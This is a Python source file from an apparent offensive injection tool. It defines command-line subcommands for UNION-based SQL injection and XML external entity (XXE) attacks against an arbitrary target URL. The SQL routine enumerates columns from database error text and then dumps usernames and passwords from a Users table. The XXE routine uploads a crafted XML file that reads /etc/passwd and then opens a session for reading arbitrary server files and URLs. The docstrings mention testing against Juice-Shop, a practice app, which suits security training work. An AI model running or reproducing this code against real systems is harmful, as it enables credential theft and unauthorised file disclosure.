import html
from http import HTTPMethod
import pathlib
import re
import tempfile
from typing import Annotated, Literal, Optional
import requests
import typer
from urllib3.util import parse_url
from cveforge import tcve_command, tcve_option, Context
from cveforge.core.commands.executables.owasp.injections.xml import XMLSession
from cveforge.core.commands.executables.owasp.utils import get_cookies, get_headers
from cveforge.utils.format import cve_format


@tcve_command(categories=["cwe-91", "cwe-611", "cwe-776", "cwe-643"])
def inject():
    """OWASP Injection Command"""
    pass


@tcve_option(inject, is_command=True)
def sql(
    target: str = typer.Argument(..., help="Target URL for SQL Injection"),
    headers: Annotated[Optional[list[str,]], typer.Option("--header", "-H")] = None,
    cookies: Annotated[Optional[str], typer.Option("--cookies", "-b")] = None,
    custom_payload: Annotated[Optional[str], typer.Option("--payload", "-f")] = None,
    method: Annotated[
        Literal[
            HTTPMethod.POST,
            HTTPMethod.PATCH,
            HTTPMethod.CONNECT,
            HTTPMethod.DELETE,
            HTTPMethod.GET,
            HTTPMethod.TRACE,
            HTTPMethod.HEAD,
            HTTPMethod.OPTIONS,
        ],
        typer.Option(
            "-X",
            "--method",
        ),
    ] = HTTPMethod.GET,
    proxy: Optional[str] = typer.Option(default=None),
    blind: bool = typer.Option(
        default=False,
        help="Use Blind SQL Injection techniques, this relies on time based techniques",
    ),
    verbose: bool = typer.Option(default=False),
    max_columns: int = typer.Option(
        default=20, help="Maximum number of columns to attempt to enumerate"
    ),
):
    """
    Perform SQL Injection on a given endpoint, it opens an SQL like session to the endpoint allowing you to write SQL commands into the DB
    What it does?
    First given the current operational table try to read the columns so we can transparently use the SELECT and others (by autofilling the columns)
    Queries looks like:
        SELECT * FROM Products WHERE id = '1' UNION <YOUR QUERY HERE> -- ;

    usage:
    ```sh
    inject sql http://localhost:3000/search?q=^INJECTABLE^
    # SELECT * FROM Users WHERE username = 'admin';
    # SELECT * FROM SQLite_master;
    ```
    Tested against Juice-Shop
    """
    typer.echo(f"Performing SQL Injection test on {target}")
    # Placeholder for actual SQL injection logic

    def _request(columns: list[str], table: Optional[str] = None):
        columns_formatted = ", ".join(columns)
        table_formatted = f"FROM {table}" if table else ""
        malicius_query = f"')) UNION SELECT {columns_formatted} {table_formatted};-- " # Seems to have a length limit for the query field please try with the login username field instead
        print(f"Trying query: {malicius_query}")
        return requests.request(
            method=method,
            url=cve_format(target),
            params={"q": malicius_query},
            headers=get_headers(headers),
            cookies=get_cookies(cookies),
            proxies={"http": proxy} if proxy else None,
        )

    vulnerable_table_columns_count = 0
    for _ in range(max_columns):
        res = _request(["null"] * (vulnerable_table_columns_count + 1))
        vulnerable_table_columns_count += 1
        if (
            re.search(
                "SQLITE_ERROR: SELECTs to the left and right of UNION do not have the same number of result columns",
                res.text,
            )
            is None
        ):
            print(
                f"Vulnerable number of columns found: {vulnerable_table_columns_count}"
            )
            break
    else:
        typer.echo("Could not determine the number of vulnerable columns")
        return

    parts = ["null"] * vulnerable_table_columns_count

    tables_columns = parts.copy()
    tables_columns[0] = "username"
    tables_columns[1] = "password"
    # response = _request(tables_columns, "SQLite_master")
    response = _request(tables_columns, "Users")

    if response.headers.get("Content-Type", "").startswith("application/json"):
        Context().stdout.print_json(response.text)
    else:
        Context().stdout.print(response.text)


@tcve_option(inject, is_command=True)
def xss(target: str = typer.Option(..., help="Target URL for XSS Injection")):
    """
    Perform XSS Injection Test
    """
    typer.echo(f"Performing XSS Injection test on {target}")
    # Placeholder for actual XSS injection logic
    pass


@tcve_option(inject, is_command=True)
def xml(
    target: str = typer.Argument(help="Target URL for XML Injection"),
    headers: Annotated[Optional[list[str,]], typer.Option("--header", "-H")] = None,
    cookies: Annotated[Optional[str], typer.Option("--cookies", "-b")] = None,
    custom_payload: Annotated[Optional[str], typer.Option("--payload", "-f")] = None,
    method: Annotated[
        Literal[
            HTTPMethod.POST,
            HTTPMethod.PATCH,
            HTTPMethod.CONNECT,
            HTTPMethod.DELETE,
            HTTPMethod.GET,
            HTTPMethod.TRACE,
            HTTPMethod.HEAD,
            HTTPMethod.OPTIONS,
        ],
        typer.Option(
            "-X",
            "--method",
        ),
    ] = HTTPMethod.POST,
    file_name: str = typer.Option(default="file"),
    proxy: Optional[str] = typer.Option(default=None),
    path: Optional[str] = typer.Argument(default=None),
    verbose: bool = typer.Option(default=False),
):
    """
    Perform XML Injection on a given endpoint
    usage:
    ```sh
    inject xml http://localhost:3000/file-upload
    ```
    defaults:
        :method: POST
    The above enables a session that can be worked on commands like ls and cd can be used there
    Tested against Juice-Shop
    """
    typer.echo(f"Performing XML Injection test on {target}")
    context = Context()
    url = parse_url(target)
    # Placeholder for actual XML injection logic
    r_headers: dict[str, str] = get_headers(headers)

    r_cookies: dict[str, str] = get_cookies(cookies)
    if url.host:
        r_headers["Origin"] = url.host
        r_headers["Referer"] = target
    r_headers["Accept"] = "*/*"

    def _request(path: str):
        file = tempfile.TemporaryFile(mode="w+b")

        if custom_payload:
            formatted_injection = custom_payload
        else:
            injector_xml = context.PAYLOAD_DIR_SRC / "cwe/91/injector.xml"
            injector_code = injector_xml.open("rb")
            formatted_injection = injector_code.read().decode()
            injector_code.close()
        formatted_injection = formatted_injection.format(PATH=path)
        file.write(formatted_injection.encode())
        file.seek(0)
        response = requests.request(
            method=method,
            url=cve_format(target),
            headers=r_headers,
            cookies=r_cookies,
            files={file_name: ("file.xml", file, "text/xml")},
            proxies={"http": proxy} if proxy else None,
        )
        file.close()
        return response

    response = _request("file:///etc/passwd")
    matches = re.search(
        r"[\w]+:[\w]+:[\w]+:[\w]+:[\w]+:[\w\\/-_\ ]+:[\w\\/-_\ ]+", response.text
    )
    if matches:
        prefix: bytes = response.content[0 : matches.start()]
        suffix: bytes = response.content[matches.end() :]

        # content = response.content.removeprefix(prefix).removesuffix(suffix)
        def _transform_response(response: requests.Response, path: str):
            pattern = r"{}.*?\(file\.xml\)".format(re.escape(path))
            content = re.search(pattern, response.text)
            if content:
                content = content[0]
                content = html.unescape(
                    content.removeprefix(path).removesuffix("(file.xml)").strip()
                )
                content = content[content.index("<foo>") + 5 : -6]
                print(content)
            else:
                print("Command not worked")
                if verbose:
                    print("Full Response: ", response.text)
            return content

        if path:
            if path.startswith(("file", "http", "ftp", "tcp")):
                response = _request(path)
                _transform_response(response, path)
            else:
                try:
                    pth = "file://" + str(pathlib.Path(path))
                    response = _request(pth)
                    _transform_response(response, path)
                except Exception:
                    response = _request(path)
                    _transform_response(response, path)
        else:
            pass
        context.set_current_session(
            XMLSession(
                prefix=prefix,
                suffix=suffix,
                protocol="http+xml",
                hostname=url.hostname,
                port=url.port,
                path=url.path,
            )
        )
